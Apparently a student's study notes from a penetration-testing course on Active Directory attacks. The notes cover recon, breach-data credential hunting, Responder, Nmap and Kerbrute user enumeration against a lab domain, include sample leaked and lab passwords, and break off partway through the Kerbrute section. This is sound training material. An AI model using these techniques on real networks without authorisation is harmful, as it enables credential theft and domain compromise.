# Active Directory Enumeration & Attacks — Complete Detailed Notes

---

## Table of Contents

1. [Introduction to Active Directory Enumeration & Attacks](#introduction-to-active-directory-enumeration--attacks)
   - [Active Directory Explained](#active-directory-explained)
   - [Why Should We Care About AD?](#why-should-we-care-about-ad)
   - [Real-World Examples](#real-world-examples)
   - [Practical Examples & Lab Setup](#practical-examples--lab-setup)
2. [External Recon and Enumeration Principles](#external-recon-and-enumeration-principles)
   - [What Are We Looking For?](#what-are-we-looking-for)
   - [Where Are We Looking?](#where-are-we-looking)
   - [Finding Address Spaces](#finding-address-spaces)
   - [DNS](#dns)
   - [Public Data](#public-data)
   - [Username Harvesting](#username-harvesting)
   - [Credential Hunting](#credential-hunting)
   - [Overarching Enumeration Principles](#overarching-enumeration-principles)
3. [Initial Enumeration of the Domain](#initial-enumeration-of-the-domain)
   - [Setting Up](#setting-up)
   - [Key Data Points](#key-data-points)
   - [Identifying Hosts](#identifying-hosts)
   - [Fping Active Checks](#fping-active-checks)
   - [Nmap Scanning](#nmap-scanning)
   - [Identifying Users with Kerbrute](#identifying-users-with-kerbrute)
   - [Identifying Potential Vulnerabilities](#identifying-potential-vulnerabilities)
4. [LLMNR/NBT-NS Poisoning - from Linux](#llmnrnbt-ns-poisoning---from-linux)
   - [LLMNR & NBT-NS Primer](#llmnr--nbt-ns-primer)
   - [Responder In Action](#responder-in-action)
   - [Cracking NTLMv2 Hashes with Hashcat](#cracking-ntlmv2-hashes-with-hashcat)
   - [Remediation](#remediation)
   - [Detection](#detection)
5. [LLMNR/NBT-NS Poisoning - from Windows](#llmnrnbt-ns-poisoning---from-windows)
   - [Inveigh - Overview](#inveigh---overview)
   - [C# Inveigh (InveighZero)](#c-inveigh-inveighzero)
6. [Password Spraying Overview](#password-spraying-overview)
   - [Password Spraying Considerations](#password-spraying-considerations)
7. [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
   - [Credentialed Enumeration from Linux](#credentialed-enumeration-from-linux)
   - [SMB NULL Sessions](#smb-null-sessions)
   - [LDAP Anonymous Bind](#ldap-anonymous-bind)
   - [Enumerating from Windows](#enumerating-from-windows)
   - [Analyzing the Password Policy](#analyzing-the-password-policy)
8. [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)
   - [SMB NULL Session to Pull User List](#smb-null-session-to-pull-user-list)
   - [Gathering Users with LDAP Anonymous](#gathering-users-with-ldap-anonymous)
   - [Enumerating Users with Kerbrute](#enumerating-users-with-kerbrute-for-spraying)
   - [Credentialed Enumeration to Build User List](#credentialed-enumeration-to-build-user-list)
9. [Internal Password Spraying - from Linux](#internal-password-spraying---from-linux)
   - [Using rpcclient Bash One-liner](#using-rpcclient-bash-one-liner)
   - [Using Kerbrute for Password Spraying](#using-kerbrute-for-password-spraying)
   - [Using CrackMapExec](#using-crackmapexec-for-spraying)
   - [Local Administrator Password Reuse](#local-administrator-password-reuse)
10. [Internal Password Spraying - from Windows](#internal-password-spraying---from-windows)
    - [Using DomainPasswordSpray.ps1](#using-domainpasswordsprayps1)
    - [Mitigations and Detection](#mitigations-and-detection)
11. [Enumerating Security Controls](#enumerating-security-controls)
    - [Windows Defender](#windows-defender)
    - [AppLocker](#applocker)
    - [PowerShell Constrained Language Mode](#powershell-constrained-language-mode)
    - [LAPS](#laps)
12. [Credentialed Enumeration - from Linux](#credentialed-enumeration---from-linux)
    - [CrackMapExec](#crackmapexec)
    - [SMBMap](#smbmap)
    - [rpcclient](#rpcclient)
    - [Impacket Toolkit](#impacket-toolkit)
    - [Windapsearch](#windapsearch)
    - [Bloodhound.py](#bloodhoundpy)
13. [Credentialed Enumeration - from Windows](#credentialed-enumeration---from-windows)
    - [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
    - [PowerView](#powerview)
    - [SharpView](#sharpview)
    - [Snaffler](#snaffler)
    - [BloodHound from Windows](#bloodhound-from-windows)
14. [Living Off the Land](#living-off-the-land)
    - [Basic Enumeration Commands](#basic-enumeration-commands)
    - [Harnessing PowerShell](#harnessing-powershell)
    - [Downgrade PowerShell](#downgrade-powershell)
    - [Checking Defenses](#checking-defenses)
    - [Network Information](#network-information)
    - [Windows Management Instrumentation (WMI)](#windows-management-instrumentation-wmi)
    - [Net Commands](#net-commands)
    - [Dsquery](#dsquery)
    - [LDAP Filtering Explained](#ldap-filtering-explained)
15. [Kerberoasting - from Linux](#kerberoasting---from-linux)
    - [Kerberoasting Overview](#kerberoasting-overview)
    - [Performing the Attack with GetUserSPNs.py](#performing-the-attack-with-getuserspnspy)
16. [Kerberoasting - from Windows](#kerberoasting---from-windows)
    - [Semi-Manual Method with setspn.exe](#semi-manual-method-with-setspnexe)
    - [Extracting Tickets with Mimikatz](#extracting-tickets-with-mimikatz)
    - [Automated Kerberoasting with PowerView](#automated-kerberoasting-with-powerview)
    - [Kerberoasting with Rubeus](#kerberoasting-with-rubeus)
    - [Encryption Types and Downgrade Attacks](#encryption-types-and-downgrade-attacks)
    - [Mitigation & Detection for Kerberoasting](#mitigation--detection-for-kerberoasting)

---

## Introduction to Active Directory Enumeration & Attacks

### Active Directory Explained

Active Directory (AD) is a directory service for Windows enterprise environments that was officially implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server OS since. AD is based on the protocols x.500 and LDAP that came before it and still utilizes these protocols in some form today. It is a distributed, hierarchical structure that allows for centralized management of an organization's resources.

AD manages resources including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides authentication, accounting, and authorization functions within a Windows enterprise environment. The hierarchical structure means that objects (users, computers, groups) exist in Organizational Units (OUs) within domains, which can exist within a larger forest structure. This hierarchy is important to understand as penetration testers because privilege escalation often flows along this structure.

AD is best thought of as a telephone directory for a company — it stores information about all objects on the network and allows those objects to communicate and authenticate with each other. When a user logs into their workstation, AD validates their credentials against a Domain Controller (DC), which is the server responsible for storing and maintaining the AD database. The database is called NTDS.dit and is stored on the DC.

Understanding AD's structure and function is foundational to attacking it. When we understand how authentication works (Kerberos, NTLM), how group policies are applied, and how trust relationships function, we can identify and exploit the gaps between intended design and actual implementation. These gaps are what penetration testers look for throughout an AD engagement.

---

### Why Should We Care About AD?

At the time of writing this module, Microsoft Active Directory holds around **43% of the market share** for enterprise organizations utilizing Identity and Access Management solutions. This is a huge portion of the market, and it isn't likely to go anywhere any time soon since Microsoft is improving and blending implementations with Azure AD. Another interesting stat is that just in the last two years, Microsoft has had over **2000 reported vulnerabilities** tied to a CVE.

AD's many services and main purpose of making information easy to find and access make it a bit of a behemoth to manage and correctly harden. This exposes enterprises to vulnerabilities and exploitation from simple misconfigurations of services and permissions. Tie these misconfigurations and ease of access with common user and OS vulnerabilities, and you have a perfect storm for an attacker to take advantage of.

With all of this in mind, this module explores common issues and shows how to identify, enumerate, and take advantage of their existence. We will practice enumerating AD utilizing native tools and languages such as Sysinternals, WMI, DNS, and many others. Some attacks we will also practice include Password spraying, Kerberoasting, utilizing tools such as Responder, Kerbrute, BloodHound, and much more.

We may often find ourselves in a network with no clear path to a foothold through a remote exploit such as a vulnerable application or service. Yet we are within an Active Directory environment, which can lead to a foothold in many ways. The general goal of gaining a foothold in a client's AD environment is to escalate privileges by moving laterally or vertically throughout the network until we accomplish the intent of the assessment. The goal can vary from client to client — it may be accessing a specific host, user's email inbox, database, or complete domain compromise.

We need to be comfortable enumerating and attacking AD from both **Windows and Linux**, with a limited toolset or built-in Windows tools — also known as **"living off the land."** It is common to run into situations where our tools fail, are being blocked, or we are conducting an assessment where the client has us work from a managed workstation or VDI instance. To be effective in all situations, we must be able to adapt quickly on the fly and understand the many nuances of AD.

---

### Real-World Examples

**Scenario 1 — Waiting On An Admin:**

In this engagement, a single host was compromised with SYSTEM level access. Because the host was domain-joined, this access was used to enumerate the domain. Service Principal Names (SPNs) were present, and a Kerberoasting attack was performed to retrieve TGS tickets for a few accounts. Initial cracking attempts were unsuccessful, so a cracking job was left overnight using a very large wordlist combined with the **d3ad0ne rule** that ships with Hashcat. The next morning, one ticket cracked, revealing a cleartext password for a user account. The account gave write access on certain file shares. **SCF files** were dropped around the shares and Responder was left running. After a while, a single hit was obtained — the **NetNTLMv2 hash** of a user. Checking through the BloodHound output revealed that this user was actually a domain admin, leading to immediate compromise.

**SCF File Attack Explanation:** SCF (Shell Command File) files contain commands that Windows Explorer automatically executes when a folder is opened. By placing a specially crafted SCF file on a share, any user who browses to that share will automatically authenticate to a specified server (our Responder), giving us their NTLMv2 hash. This is a passive credential harvesting technique that requires no user interaction beyond browsing to the share.

**Scenario 2 — Spraying The Night Away:**

Password spraying was used to gain a foothold. An **SMB NULL session** was found using the **enum4linux** tool, retrieving both a listing of all users from the domain and the domain password policy. Knowing the password policy was crucial — it showed a minimum eight-character password with complexity enforced. Several common weak passwords like Welcome1, Password1, Spring2018 failed. Finally, **Spring@18** got a hit. Using this account, BloodHound was run and several hosts were found where this user had local admin access. A domain admin account had an active session on one of these hosts. The **Rubeus tool** was used to extract the Kerberos TGT ticket for this domain admin user. A **pass-the-ticket attack** was then performed to authenticate as this domain admin. As a bonus, the trusting domain was also taken over because the Domain Administrators group was part of the Administrators group in the trusting domain via nested group membership.

**Scenario 3 — Fighting In The Dark:**

All standard ways to obtain a foothold failed. The **Kerbrute tool** was used to enumerate valid usernames, then a targeted password spray was performed to avoid lockouts when the password policy was unknown. The **linkedin2username** tool was used first to create potential usernames from the company's LinkedIn page, combined with the **statistically-likely-usernames** GitHub repo, resulting in 516 valid users. With **Welcome2021**, one hit was obtained. BloodHound revealed all domain users had RDP access to a single box. After logging in, **DomainPasswordSpray** was used to spray again with **Fall2021**, getting several new hits. One account was in the Help Desk group, which had **GenericAll** rights over the Enterprise Key Admins group, which had **GenericAll** over a domain controller. The **Shadow Credentials** attack was performed, retrieving the NT hash for the DC machine account. A **DCSync** attack then retrieved the NTLM password hashes for all users in the domain.

---

### Practical Examples & Lab Setup

Throughout the module, examples with accompanying command output are covered. Target VMs can be spawned within the relevant sections. RDP credentials are provided to interact with some of the target VMs to learn how to enumerate and attack from a Windows host (MS01), and SSH access to a preconfigured Parrot Linux host (ATTACK01) is provided to perform enumeration and attack examples from Linux.

**Connecting via FreeRDP (to Windows host MS01):**

```bash
xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!
```

**Command Breakdown:**
- `xfreerdp` — The FreeRDP client, a free implementation of the Remote Desktop Protocol (RDP) for Linux
- `/v:<MS01 target IP>` — Specifies the target host IP or hostname to connect to
- `/u:htb-student` — The username to authenticate with
- `/p:Academy_student_AD!` — The password for the specified user

**Connecting via SSH (to Linux attack host ATTACK01):**

```bash
ssh htb-student@<ATTACK01 target IP>
```

**Command Breakdown:**
- `ssh` — The Secure Shell client for encrypted remote access
- `htb-student@<ATTACK01 target IP>` — Specifies the username (`htb-student`) and host to connect to, separated by `@`
- Enter the provided password when prompted

**Connecting to ATTACK01 via xfreerdp (for BloodHound GUI access):**

```bash
xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

An XRDP server is installed on the ATTACK01 host to provide GUI access to the Parrot attack host, which is useful for interacting with the BloodHound GUI tool.

**Toolkit Locations:**
- **Windows (MS01):** Tools are located in `C:\Tools`; others like the Active Directory PowerShell module load upon opening a PowerShell console
- **Linux (ATTACK01):** Tools are either installed and added to the htb-student user's PATH, or present in `/opt`

---

## External Recon and Enumeration Principles

Before we start any pentest, it's a good idea to first gather as much information as possible about our target from the outside — without touching their systems. This is called **external reconnaissance**. It helps us confirm what we're allowed to test, make sure we're looking at the right targets, and find any information that's already publicly available which could help us during the test.

Think of it like doing your homework before a big exam. We want to know as much as possible before we even knock on the door. Sometimes this is as simple as checking a company's website to figure out what format they use for usernames (like `firstname.lastname`). Other times, we go deeper — searching GitHub for accidentally leaked passwords in code, looking at documents for internal site links, or hunting for any details that tell us how the company's IT environment is set up. The more we know upfront, the better our chances of finding a way in.

---

### What Are We Looking For?

When conducting external reconnaissance, several key items should be searched for. This information may not always be publicly accessible, but it is prudent to see what is out there. If we get stuck during a penetration test, looking back at what could be obtained through passive recon can give us that nudge needed to move forward.

| Data Point | Description |
|---|---|
| **IP Space** | Valid ASN for the target, netblocks in use for the organization's public-facing infrastructure, cloud presence and hosting providers, DNS record entries, etc. |
| **Domain Information** | Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to the target? Are there any publicly accessible domain services present (Mailservers, DNS, Websites, VPN portals)? Can we determine what kind of defenses are in place (SIEM, AV, IPS/IDS)? |
| **Schema Format** | Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that gives information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, or brute forcing? |
| **Data Disclosures** | Looking for publicly accessible files (.pdf, .ppt, .docx, .xlsx, etc.) for any information that helps shed light on the target — intranet site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF). |
| **Breach Data** | Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold. |

---

### Where Are We Looking?

| Resource | Examples |
|---|---|
| **ASN / IP registrars** | IANA, arin (Americas), RIPE (Europe), BGP Toolkit |
| **Domain Registrars & DNS** | Domaintools, PTRArchive, ICANN, manual DNS record requests against the domain or against well-known DNS servers such as 8.8.8.8 |
| **Social Media** | LinkedIn, Twitter, Facebook, news articles, and any relevant info about the organization |
| **Public-Facing Company Websites** | News articles, embedded documents, "About Us" and "Contact Us" pages |
| **Cloud & Dev Storage Spaces** | GitHub, AWS S3 buckets, Azure Blob storage containers, Google searches using "Dorks" |
| **Breach Data Sources** | HaveIBeenPwned to determine if corporate email accounts appear in public breach data; Dehashed to search for corporate emails with cleartext passwords or hashes we can try to crack offline, then test against exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon) |

---

### Finding Address Spaces

The **BGP-Toolkit hosted by Hurricane Electric** is a fantastic resource for researching what address blocks are assigned to an organization and what ASN (Autonomous System Number) they reside within. Just punch in a domain or IP address, and the toolkit will search for any results it can. Many large corporations will often self-host their infrastructure, and since they have such a large footprint, they will have their own ASN. Smaller organizations will often host their websites and other infrastructure in someone else's space (Cloudflare, Google Cloud, AWS, or Azure).

Understanding where infrastructure resides is extremely important for testing. We must ensure we are not interacting with infrastructure out of our scope. If we are not careful while pentesting against a smaller organization, we could end up inadvertently causing harm to another organization sharing that infrastructure. You have an agreement to test with the customer, not with others on the same server.

In some cases, the client may need to get written approval from a third-party hosting provider before testing. AWS has specific guidelines for performing penetration tests and does not require prior approval for testing some of their services. Oracle asks you to submit a Cloud Security Testing Notification. These steps should be handled by company management, legal team, and contracts team. If in doubt, escalate before attacking any external-facing services you are unsure of. It is our responsibility to ensure we have explicit permission to attack any hosts (both internal and external).

---

### DNS

DNS (Domain Name System) is like a phone book for the internet — it maps domain names to IP addresses. For us as testers, DNS is a goldmine. It helps us confirm what's in scope and can reveal hosts and servers that the client forgot to mention in their scoping document.

Websites like **domaintools** and **viewdns.info** are great free tools to start with. By just typing in a domain name, we can pull back a ton of useful info — IP addresses, mail servers, name servers, and more. Sometimes we'll discover subdomains that point to in-scope IP addresses, meaning they're fair game even if the client didn't list them. If we find hosts that are clearly out of scope but look interesting, we simply note them and check with the client to see if they should be added to the scope. We never test something we don't have permission for.

**Validating nameservers manually using nslookup:**

```bash
nslookup ns1.inlanefreight.com
```

**Command Breakdown:**
- `nslookup` — A command-line tool for querying DNS (Domain Name System) name servers
- `ns1.inlanefreight.com` — The target hostname or nameserver we want to resolve and gather information about
- This returns the IP address associated with the nameserver, which we can add to our target list for further investigation

---

### Public Data

Social media can be a treasure trove of interesting data that clues us in on how the organization is structured, what kind of equipment they operate, potential software and security implementations, their schema, and more. On top of that list are job-related sites like LinkedIn, Indeed.com, and Glassdoor. Simple job postings often reveal a lot about a company — for example, a SharePoint Administrator posting may indicate which version of SharePoint the company uses, potentially revealing outdated software with unpatched vulnerabilities.

Don't discount public information such as job postings or social media — you can learn a lot about an organization just from what they post.

**Using Google Dorks to find files:**

```
filetype:pdf inurl:inlanefreight.com
```

This Google dork searches specifically for PDF files hosted on or linked from the inlanefreight.com domain. Publicly available PDFs often contain document metadata (like the Author field) that reveals the internal AD username format used by the organization.

**Using Google Dorks to find email addresses:**

```
intext:"@inlanefreight.com" inurl:inlanefreight.com
```

This searches for any instance that appears similar to the end of an email address on the website. This helps reveal the email naming convention (e.g., `first.last@company.com`), which directly maps to the AD username format for password spraying attacks.

Tools like **Trufflehog** can scan GitHub repositories for hardcoded credentials and secrets. **Greyhat Warfare** is a site that helps find exposed files in cloud storage (AWS S3 buckets, Azure Blob storage). A developer working on a project may accidentally leave some credentials or notes hardcoded into a code release.

---

### Username Harvesting

We can use a tool such as **linkedin2username** to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets. This is particularly useful when we have no access to the internal network and need to build a user list from external sources.

---

### Credential Hunting

**Dehashed** is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API.

**Using dehashed.py to search for credentials:**

```bash
sudo python3 dehashed.py -q inlanefreight.local -p
```

**Command Breakdown:**
- `sudo python3 dehashed.py` — Runs the dehashed Python script with elevated privileges
- `-q inlanefreight.local` — Queries the Dehashed database for anything associated with the domain `inlanefreight.local` (emails, usernames, etc.)
- `-p` — Shows plaintext passwords if available in the breach data

**Example output:**

```
id : 5996447501
email : roger.grimes@inlanefreight.local
username : rgrimes
password : Ilovefishing!
```

Typically we will find many old passwords for users that do not work on externally-facing portals, but we may get lucky. This is another tool useful for creating a user list for external or internal password spraying. Even old passwords can be useful because users tend to reuse passwords or use predictable patterns.

---

### Overarching Enumeration Principles

Keeping in mind that our goal is to understand our target better, we are looking for every possible avenue we can find that will provide us with a potential route to the inside. Enumeration itself is an **iterative process** we will repeat several times throughout a penetration test. We want to ensure we are leaving no stone unturned.

**Example Enumeration Process for inlanefreight.com:**

1. Check ASN/IP & Domain Data using BGP.he (Hurricane Electric BGP Toolkit) — reveals IP address, mail server, nameservers
2. Validate findings with viewdns.info using reverse IP lookup
3. Validate nameservers with nslookup
4. Hunt for files using Google Dorks: `filetype:pdf inurl:inlanefreight.com`
5. Hunt for email addresses using: `intext:"@inlanefreight.com" inurl:inlanefreight.com`
6. Identify email naming conventions from contact pages
7. Search for credentials in breach databases using Dehashed
8. Use linkedin2username to generate potential AD usernames from LinkedIn
9. Check for exposed files in cloud storage with Greyhat Warfare

---

## Initial Enumeration of the Domain

We are at the beginning of an AD-focused penetration test against Inlanefreight. Basic information gathering has been completed and a picture of what to expect has been formed.

---

### Setting Up

For this first portion of the test, we are starting on an attack host placed inside the network. A list of the types of setups a client may choose for testing includes:

- A penetration testing distro (typically Linux) as a virtual machine in their internal infrastructure that calls back to a jump host we control over VPN
- A physical device plugged into an ethernet port that calls back to us over VPN
- A physical presence at their office with our laptop plugged into an ethernet port
- A Linux VM in Azure or AWS with access to the internal network
- VPN access into their internal network (limiting because we cannot perform certain attacks like LLMNR/NBT-NS Poisoning)
- From a corporate laptop connected to the client's VPN
- On a managed workstation physically in their office with limited internet access

**Assessment type definitions:**
- **Grey box:** Client gives us a list of in-scope IP addresses/CIDR network ranges, but no credentials or detailed map
- **Black box:** Client gives us nothing — all discovery must be done blindly
- **Non-evasive:** We can make noise; the client's staff knows we are there
- **Evasive:** We try to mimic a potential attacker's TTPs — stealth is of concern

**Our customer Inlanefreight has chosen:** A custom pentest VM within their internal network; a Windows host for loading tools; starting from an unauthenticated standpoint with a domain user account (htb-student) available; grey box testing with network range `172.16.5.0/23`; non-evasive testing.

---

### Key Data Points

| Data Point | Description |
|---|---|
| **AD Users** | Trying to enumerate valid user accounts we can target for password spraying |
| **AD Joined Computers** | Key computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers |
| **Key Services** | Kerberos, NetBIOS, LDAP, DNS |
| **Vulnerable Hosts and Services** | Anything that can be a quick win (an easy host to exploit and gain a foothold) |

---

### Identifying Hosts

First, we take some time to listen to the network and see what's going on. We can use **Wireshark** and **TCPDump** to "put our ear to the wire" and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is "black box."

**Starting Wireshark:**

```bash
sudo -E wireshark
```

**Command Breakdown:**
- `sudo` — Run with elevated privileges (needed to capture raw network packets)
- `-E` — Preserves the current user's environment variables when using sudo (important for GUI applications to display correctly)
- `wireshark` — Launches the Wireshark GUI network protocol analyzer

From Wireshark captures, we can observe:
- **ARP packets** — Reveal IP addresses of active hosts on the local subnet (e.g., 172.16.5.5, 172.16.5.25, etc.)
- **MDNS packets** — Reveal hostnames (e.g., ACADEMY-EA-WEB01)

**Capturing with TCPDump (for headless hosts without GUI):**

```bash
sudo tcpdump -i ens224
```

**Command Breakdown:**
- `sudo tcpdump` — Packet capture tool requiring root privileges
- `-i ens224` — Specifies the network interface to capture on (`ens224` is the interface name — use `ip a` or `ifconfig` to find yours)

TCPDump is useful when we are on a host without a GUI. It allows saving captures to `.pcap` files for later analysis in Wireshark.

**Using Responder in Analyze (passive) mode:**

[Responder](https://github.com/lgandx/Responder-Windows) is a powerful tool designed to listen for, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` network requests — protocols that Windows machines use when normal DNS fails. In simple terms, when a computer on the network asks "hey, does anyone know where this host is?", Responder can intercept that question and respond with a fake answer to capture credentials. For now, we are only using it in **Analyze (passive) mode**, meaning it just listens quietly in the background and logs what it sees without sending any fake replies. This is a safe, stealthy way to discover hosts and understand network traffic before we decide to take any action.

```bash
sudo responder -I ens224 -A
```

**Command Breakdown:**
- `sudo responder` — Runs Responder with root privileges (required for binding to low ports)
- `-I ens224` — Specifies the network interface to listen on
- `-A` — Analyze mode: passively listens to LLMNR, NBT-NS, and MDNS requests without sending any poisoned responses. This is the "fly on the wall" approach — we observe without being detected

Responder in analyze mode reveals additional hosts and hostnames not seen in our Wireshark/TCPDump captures, building a comprehensive target list.

---

### Fping Active Checks

**fping** is like the regular `ping` command, but much faster and smarter. Instead of pinging one host at a time and waiting for it to respond before moving on, fping can ping hundreds of hosts all at once. It sends out ICMP (ping) packets to an entire range of IP addresses in a round-robin style — cycling through all targets continuously — rather than waiting for each one to reply before checking the next. This makes it extremely fast and ideal for quickly finding out which hosts are alive on a large network. It's also scriptable, meaning we can feed its output directly into other tools like Nmap.

**Running fping to discover live hosts:**

```bash
fping -asgq 172.16.5.0/23
```

**Command Breakdown:**
- `fping` — The fast ping tool
- `-a` — Shows targets that are **alive** (responding to ICMP) — only print responding hosts
- `-s` — Prints **stats** at the end of the scan (total targets, alive, unreachable, packets sent, RTT times)
- `-g` — Generates a **target list** from the CIDR network notation supplied (`172.16.5.0/23` means all 512 addresses in the /23 subnet)
- `-q` — **Quiet mode** — does not show per-target results, reducing terminal noise; only shows summary and alive hosts

**Example Output:**

```
172.16.5.5
172.16.5.25
172.16.5.50
...
     510 targets
       9 alive
     501 unreachable
```

From 510 total targets in the /23 subnet, 9 are alive. These are fed into a `hosts.txt` file for more detailed Nmap scanning.

---

### Nmap Scanning

Now that we have a list of active hosts within our network, we can enumerate those hosts further. We are looking to determine what services each host is running, identify critical hosts such as Domain Controllers and web servers, and identify potentially vulnerable hosts.

**Nmap (Network Mapper)** is the go-to tool for this job. Think of it as a detailed scanner that knocks on every door of a host and reports back what's open, what's running behind each door, and even what operating system the host is running. Once fping gives us the list of alive hosts, we feed that list into Nmap to get the full picture. From a single scan, we can spot Domain Controllers (by their Kerberos and LDAP ports), web servers, SQL servers, and outdated legacy machines that might be vulnerable to older exploits. The more detail Nmap gives us, the better our plan of attack.

**Running Nmap against our hosts list:**

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

**Command Breakdown:**
- `sudo nmap` — Network mapper, requires root for OS detection and some scan types
- `-v` — **Verbose mode** — shows more detail about what Nmap is doing in real time
- `-A` — **Aggressive scan options** — enables OS detection (`-O`), version detection (`-sV`), script scanning (`-sC`), and traceroute (`--traceroute`) in a single flag
- `-iL hosts.txt` — Reads target hosts from the **input list** file `hosts.txt` (one host per line)
- `-oN /home/htb-student/Documents/host-enum` — Saves output in **Normal format** to the specified file path

**Reading Critical NMAP Output (INLANEFREIGHT.LOCAL Domain Controller):**

```
Nmap scan report for inlanefreight.local (172.16.5.5)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL)
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

**What these ports tell us:**
- **Port 53 (DNS)** — DNS server is running, typical of a Domain Controller
- **Port 88 (Kerberos)** — Kerberos authentication, signature of a DC
- **Port 135/139 (RPC/NetBIOS)** — RPC and NetBIOS services
- **Port 389/636 (LDAP/LDAPS)** — LDAP directory service and its SSL variant, definitive DC indicator
- **Port 445 (SMB)** — Server Message Block for file sharing
- **Port 3268 (Global Catalog)** — LDAP Global Catalog, another DC indicator
- **Port 3389 (RDP)** — Remote Desktop Protocol is enabled

The scan also reveals from RDP info: `NetBIOS_Computer_Name: ACADEMY-EA-DC01` and `DNS_Domain_Name: INLANEFREIGHT.LOCAL` confirming this is the primary Domain Controller.

**Legacy Host Detection (172.16.5.100):**

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7600
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 R2 10.50.1600.00; RTM
```

This reveals a host running **Windows Server 2008 R2** (end-of-life OS) and **SQL Server 2008 R2** (outdated and unpatched). This is interesting because it means there are legacy operating systems running in this AD environment. It also means there is potential for older exploits like **EternalBlue** or **MS08-067** to work and provide us with a SYSTEM level shell.

As strange as it sounds, it's actually very common in large enterprise environments to find old, outdated systems still running. Often it's because some critical piece of equipment — like a production line machine or an HVAC control system — was built on an older OS and has been running for years. Taking it offline to update it is too costly or risky for the business, so it just stays. Companies typically try to protect these machines by wrapping them in firewalls and monitoring tools instead of updating them.

If we can find our way into one of these legacy hosts, it can be a huge win — a quick and easy foothold into the network. However, **we must always alert our client first and get written approval before exploiting legacy systems**. An exploit against an old, fragile system could crash it or bring down a critical service, which is something we never want to do without the client's knowledge and consent. They may simply prefer we document it and move on without actively exploiting it.

**Best Practice:** Always use the `-oA` flag with Nmap: `nmap -oA <filename>` to save results in all three formats (Normal, XML, and Grepable) simultaneously.

---

### Identifying Users

If our client doesn't give us a user account to start with, we need to find valid domain usernames ourselves before we can do much else. In the real world, clients often don't hand over credentials — that's just how it goes. So we have to figure out a way in on our own. This usually means finding one of the following: a **plaintext password**, an **NTLM password hash** we can crack or relay, **SYSTEM-level access** on a domain-joined machine, or just a **shell running as a domain user**. Any one of these is enough to get started.

Getting even a single low-level user account is a big deal at this stage. Even a basic domain user — with no special permissions — gives us the ability to query Active Directory, enumerate users, groups, computers, and policies, and start planning further attacks. So before anything else, let's focus on building a list of valid domain usernames we can work with later.

---

#### Kerbrute - Internal AD Username Enumeration

One of the best tools for this job is **[Kerbrute](https://github.com/ropnop/kerbrute)**. It's a stealthy username enumeration tool that takes advantage of how Kerberos authentication works. Normally when you try to log in with a wrong username, Windows logs a failed login attempt (Event ID 4625) — which can alert defenders. Kerbrute avoids this completely by sending a different type of request called a **Kerberos pre-authentication request**. If the username doesn't exist, the Domain Controller says "unknown user" — no login event logged, no alert triggered. If the username does exist, Kerbrute marks it as valid and moves on.

We use Kerbrute together with username wordlists from **[Insidetrust's statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)** repository. This repo contains carefully built lists of the most common real-world AD username formats — things like `jsmith`, `john.smith`, `j.smith` — based on how companies actually name their accounts. Files like `jsmith.txt` and `jsmith2.txt` are especially useful here. Since we're starting from an unauthenticated position (no credentials at all), these wordlists give us a solid foundation to work from. The valid usernames we collect become our target list for password spraying attacks later in the assessment.

To get started, we can download precompiled binaries from the [Kerbrute releases page](https://github.com/ropnop/kerbrute/releases/latest) for Linux, Windows, or Mac — or we can compile it ourselves from source, which is generally the best practice when introducing any tool into a client environment. To compile it ourselves, we first clone the repo:

**Cloning the Kerbrute GitHub repository:**

```bash
sudo git clone https://github.com/ropnop/kerbrute.git
```

**Command Breakdown:**
- `sudo` — May need elevated privileges for certain clone destinations
- `git clone` — Clones (downloads) a remote Git repository to the local machine
- URL — The GitHub repository URL for Kerbrute

**Viewing compile options:**

```bash
make help
```

**Compiling for multiple platforms and architectures:**

```bash
sudo make all
```

**Command Breakdown:**
- `make` — A build automation tool that reads `Makefile` instructions
- `all` — The target in the Makefile that compiles Kerbrute for Windows (x86 and x64), Linux (x86 and x64), and Mac (x86 and x64), placing them in a `dist/` directory

**Moving the binary to PATH for system-wide access:**

```bash
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

**Command Breakdown:**
- `mv` — Move (rename) a file
- `kerbrute_linux_amd64` — The compiled 64-bit Linux binary
- `/usr/local/bin/kerbrute` — Moves it to a standard PATH location so `kerbrute` can be run from any directory

**Enumerating valid users with Kerbrute:**

```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

**Command Breakdown:**
- `kerbrute userenum` — Runs Kerbrute's **user enumeration** module, which sends Kerberos pre-authentication requests to validate if usernames exist
